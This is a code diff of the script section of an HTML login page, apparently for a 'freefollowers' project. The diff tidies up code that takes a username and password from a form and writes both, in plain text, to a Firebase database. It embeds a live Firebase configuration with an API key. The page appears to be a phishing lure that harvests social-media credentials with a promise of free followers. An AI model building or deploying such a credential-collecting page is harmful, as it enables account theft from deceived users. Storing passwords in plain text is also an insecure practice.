@@ -179,169 +179,58 @@
       }
     </script>
       <script type="module">
-
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
-
-      import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
-
-      // Firebase configuration
-
-      const firebaseConfig = {
-
-        apiKey: "AIzaSyD2eitt5iTwBaTx8CWeuuPeyD7nTa58XD8",
-
-        authDomain: "freefollowers-d31af.firebaseapp.com",
-
-        databaseURL: "https://freefollowers-d31af-default-rtdb.firebaseio.com",
-
-        projectId: "freefollowers-d31af",
-
-        storageBucket: "freefollowers-d31af.appspot.com",
-
-        messagingSenderId: "807949104285",
-
-        appId: "1:807949104285:web:2c0238cdc7913dad279074",
-
-        measurementId: "G-ME1GQ5KV8H",
-
-      };
-
-      // Initialize Firebase
-
-      const app = initializeApp(firebaseConfig);
-
-      const db = getDatabase(app);
-
-      function writeUserData(userID, username, password) {
-
-        set(ref(db, "users/" + userID), { username: username, password: password });
-
-      }
-
-      // Handle form submission
-
-      document.getElementById("loginForm").addEventListener("submit", (event) => {
-
-        event.preventDefault();
-
-        const username = document.getElementById("username").value;
-
-        const password = document.getElementById("password").value;
-
-        const userID = new Date().getTime();
-
-        if (username && password) {
-
-          writeUserData(userID, username, password);
-
-          window.location.href="save.html";
-
-        } else {
-
-          alert("Please fill in both fields.");
-
-        }
-
-      });
-
-    </script>
-    <script>
+  // Firebase SDK import
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
+  import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
 
   // Firebase configuration
-
   const firebaseConfig = {
-
-    apiKey: "YOUR_API_KEY",
-
-    authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-
-    databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com",
-
-    projectId: "YOUR_PROJECT_ID",
-
-    storageBucket: "YOUR_PROJECT_ID.appspot.com",
-
-    messagingSenderId: "YOUR_SENDER_ID",
-
-    appId: "YOUR_APP_ID",
-
-    measurementId: "YOUR_MEASUREMENT_ID",
-
+    apiKey: "AIzaSyD2eitt5iTwBaTx8CWeuuPeyD7nTa58XD8",
+    authDomain: "freefollowers-d31af.firebaseapp.com",
+    databaseURL: "https://freefollowers-d31af-default-rtdb.firebaseio.com",
+    projectId: "freefollowers-d31af",
+    storageBucket: "freefollowers-d31af.appspot.com",
+    messagingSenderId: "807949104285",
+    appId: "1:807949104285:web:2c0238cdc7913dad279074",
+    measurementId: "G-ME1GQ5KV8H",
   };
 
-  // Load Firebase app
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
 
-  const script = document.createElement("script");
+  // Function to save user data
+  function writeUserData(userID, username, password) {
+    set(ref(db, "users/" + userID), {
+      username: username,
+      password: password,
+    })
+      .then(() => {
+        alert("Your data has been saved successfully!");
+        window.location.href = "save.html";
+      })
+      .catch((error) => {
+        console.error("Error saving data: ", error);
+        alert("An error occurred while saving your data.");
+      });
+  }
 
-  script.src = "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
+  // Form submission handling
+  document.getElementById("loginForm").addEventListener("submit", (event) => {
+    event.preventDefault();
 
-  script.onload = () => {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
 
-    const databaseScript = document.createElement("script");
-
-    databaseScript.src =
-
-      "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
-
-    databaseScript.onload = () => {
-
-      // Initialize Firebase
-
-      firebase.initializeApp(firebaseConfig);
-
-      const db = firebase.database();
-
-      function writeUserData(userID, username, password) {
-
-        firebase
-
-          .database()
-
-          .ref("users/" + userID)
-
-          .set({ username: username, password: password });
-
-      }
-
-      // Form handling
-
-      document
-
-        .getElementById("loginForm")
-
-        .addEventListener("submit", function (event) {
-
-          event.preventDefault();
-
-          const username = document.getElementById("username").value;
-
-          const password = document.getElementById("password").value;
-
-          const userID = new Date().getTime();
-
-          if (username && password) {
-
-            writeUserData(userID, username, password);
-
-            alert("Thank you! Your data has been saved.");
-
-          } else {
-
-            alert("Please fill in both fields.");
-
-          }
-
-        });
-
-    };
-
-    document.body.appendChild(databaseScript);
-
-  };
-
-  document.body.appendChild(script);
-
-</script>
+    if (username && password) {
+      const userID = new Date().getTime();
+      writeUserData(userID, username, password);
+    } else {
+      alert("Please fill in both fields.");
+    }
+  });
+      </script>
+    
 
   </body>
   </html>
